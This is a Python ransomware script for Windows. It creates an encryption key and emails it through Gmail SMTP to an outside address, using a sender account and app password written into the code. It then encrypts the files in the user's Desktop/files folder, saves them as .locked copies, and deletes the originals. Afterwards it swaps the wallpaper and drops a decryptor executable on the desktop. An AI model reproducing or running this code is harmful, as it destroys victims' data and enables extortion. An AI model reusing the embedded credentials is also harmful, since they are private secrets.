import threading, ctypes, nacl, tkinter, glob, shutil
import cryptography, os, requests, sys, nacl.secret, shutil
from PIL import Image, ImageDraw, ImageFont
from win32api import GetSystemMetrics
from tkinter import messagebox
from time import sleep
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from smail import sign_message

def send_email(subject, body, sender, recipients, password):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)
    smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
    smtp_server.ehlo('Gmail')
    smtp_server.starttls()
    smtp_server.login(sender, password)
    smtp_server.sendmail(sender, recipients, msg.as_string())
    smtp_server.quit()
def after_work():
    User =  os.getlogin() 
    src_dir = r"C:/Users/"+User+"/AppData/Roaming/Microsoft/Windows/Themes/CachedFiles"
    dst_dir = r"C:/Users/"+User+'/wallpaper.jpg'
    for jpgfile in glob.iglob(os.path.join(src_dir, "*.jpg")):
        shutil.copy(jpgfile, dst_dir)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}\\background.png', 3)
    src_dir = os.getcwd()+'/DeRansomware.exe'
    dst_dir = r"C:/Users/"+User+"/Desktop/Decrypt.exe"
    shutil.copy(src_dir, dst_dir)
        
class Encrypt(object):              

    def __init__(self, Target=0, BoxM=0, Url=0):

        self.Target     = Target       
        self.BoxM       = BoxM       
        # self.Url        = Url          

    def FileE(loc):                   
        try:                           
            if (os.path.isdir(loc.Target) != True) :    

                with open(loc.Target, "rb") as File:    
                        Date    = File.read()           
               
                FileName    = loc.Target                
                Encrypted   = loc.BoxM.encrypt(Date)
                if(loc.Target != sys.argv[0]):          
                    with open(f"{FileName}.locked","wb") as File: 
                        File.write(Encrypted)           
                    os.remove(loc.Target)               
        except Exception as e:print(f"Error -> {e}")
                 

User        =  os.getlogin()                              
Script      = sys.argv[0]                                 
MaxThread   = 120                                         

Key         = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)  
hexed_key = Key.hex()                                            
Box         = nacl.secret.SecretBox(Key)                                              

Message     = (f"{User} -> {Key}")                                      
PathList    = [r"C:/Users/"+User+"/Desktop/files"]   
print(PathList)                                        


subject = "Newsletter Update"
body = f"The key is : {hexed_key}"
sender = "detroitdre2022@gmail.com"
recipients = ["test_key_dre@hotmail.com"]
password = "yaikwnsfztqybqdg"

send_email(subject, body, sender, recipients, password)       

if __name__ == '__main__':  
    for  AllFiles in PathList:
        for path, subdirs, files in os.walk(AllFiles):                              
            for name in files:                              
                FilePath    = os.path.join(path, name)      
                FileSize    = os.stat(FilePath).st_size    
                if (FileSize >= 50000000 ):             
                    while True:                         
                        if len(threading.enumerate()) < MaxThread: 
                            EncrypterObj = Encrypt(FilePath, Box) 
                            threading.Thread(target=EncrypterObj.FileE, args=()).start() 
                            break                                                        
        
                        else: sleep(0.2)                                                 
                else :               
                    Encrypt(FilePath, Box).FileE()                 
    after_work()
